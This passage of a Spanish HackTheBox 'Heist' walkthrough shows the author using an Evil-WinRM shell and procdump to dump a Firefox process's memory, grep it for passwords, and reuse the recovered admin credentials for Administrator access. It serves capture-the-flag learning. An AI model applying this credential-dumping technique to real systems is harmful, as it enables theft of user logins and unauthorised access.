+<p><strong>Primero</strong>, es un proceso activo, lo digo por la fecha y <strong>segundo</strong>, <em>Firefox</em> no viene instalado por default en <strong>Windows</strong>, así que eso nos debe llamar la atención…</p>
+
+<p>Validando, efectivamente <strong>Firefox</strong> esta activo y ejecutando “algo”:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName  
+-------  ------    -----      -----     ------     --  -- -----------  
+...
+   1052      70   149408     224568       6.69   6184   1 firefox
+    347      20     9788      34516       0.05   6292   1 firefox
+    401      34    32124      92720       0.92   6436   1 firefox
+    378      28    22300      59200       0.48   6732   1 firefox
+    355      25    16336      38980       0.14   6996   1 firefox
+...
+</code></pre>
+
+<p>Bien, tenemos varias cositas para ir detrás de <strong>Firefox</strong>, podemos aprovechar esos procesos para dumpear lo que esta pasando mientras están activos, para esto podemos usar <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>, así que descarguémoslo (en el anterior link esta también el binario) yyy subámoslo a la máquina:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Chase\Videos&gt; dir 
+
+    Directory: C:\Users\Chase\Videos
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/13/2021  25:25 FM         725368 procdump.exe
+</code></pre>
+
+<p>Entonces, tomemos uno de los procesos que esta ejecutando <strong>Firefox</strong>, como por ejemplo el primero:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName  
+-------  ------    -----      -----     ------     --  -- -----------  
+...
+   1052      70   149408     224568       6.69   6184   1 firefox
+...
+</code></pre>
+
+<p>Sacamos el <strong>Id</strong> y ejecutamos el dumpeo:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Chase\Videos&gt; .\procdump.exe -ma 6184
+</code></pre>
+
+<blockquote>
+  <p><code>-ma</code> : Write a dump file with all process memory.</p>
+</blockquote>
+
+<pre><code class="language-powershell">[02:14:28] Dump 1 initiated: C:\Users\Chase\Videos\firefox.exe_210613_021428.dmp
+[02:14:28] Dump 1 writing: Estimated dump file size is 508 MB.
+[02:14:28] Dump 1 complete: 509 MB written in 0.6 seconds
+[02:14:29] Dump count reached.
+</code></pre>
+
+<p>Y obtenemos:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Chase\Videos&gt; dir
+
+    Directory: C:\Users\Chase\Videos
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/13/2021  25:25 FM      520222307 firefox.exe_210613_021428.dmp
+</code></pre>
+
+<p>Bien, pues ahora nos queda jugar con el como cualquier archivo con información…</p>
+
+<p>Despues de un rato, jugando con <a href="https://antjanus.com/blog/web-development-tutorials/how-to-grep-in-powershell/">Select-String</a> (similar al <strong>grep</strong> de toda la vida, pero para <strong>PowerShell</strong>) filtrando por “<strong>password</strong>” encontramos unas credenciales que están intentando iniciar sesión en el login que ya conocimos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_evilwinrm_dump_password.png" alt="201bash_evilwinrm_dump_password" /></p>
+
+<p>Vemos esta línea:</p>
+
+<pre><code class="language-txt">"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=  
+</code></pre>
+
+<p>De la cual obtenemos un correo y una contraseña:</p>
+
+<ul>
+  <li><code>admin@support.htb</code>:<code>4dD!5}x/re8]FBuZ</code>.</li>
+</ul>
+
+<p>Probándolas en la web son válidas y nos redirigen al apartado de problemas (<code>/issues.php</code>), pero haciendo reutilización de contraseñas logramos una <strong>PowerShell</strong> como el usuario <em>Administrator</em> en el sistema:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_evilwinrm_chase.png" alt="201bash_evilwinrm_administrator" /></p>
+
+<p>BIEEEEEEEEEEEEEEEN, solo nos queda ver las flags mi perritoowowowo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201flags.png" alt="201flags" /></p>
+
+<p>…</p>
+
+<p>Linda experiencia, el movernos de un usuario para encontrar otros usuarios me gusto un montón (además de tener otra herramienta en la mente para próximas máquinas). El dumpeo estuvo interesante, jugar con procesos para ver que esta pasando por detrás, nice!</p>
+
+<p>Y como siempre: A seguir rompiendo todo!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Heist&url=http://localhost:4000/htb/heist" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SMB">SMB</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cisco">cisco</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#firefox">firefox</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#lookupsid.py">lookupsid.py</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#procdump">procdump</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/atom">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" alt="HackTheBox - Atom"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/atom">HackTheBox - Atom</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/writeup">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" alt="HackTheBox - Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/writeup">HackTheBox - Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastion">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png" alt="HackTheBox - Bastion"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastion">HackTheBox - Bastion</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Nos moveremos con Samba, jugaremos con el backup de una máquina virtual Windows para extraer los archivos SAM y SYSTEM… Crackearemos cosillas y nos daremos cuenta...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
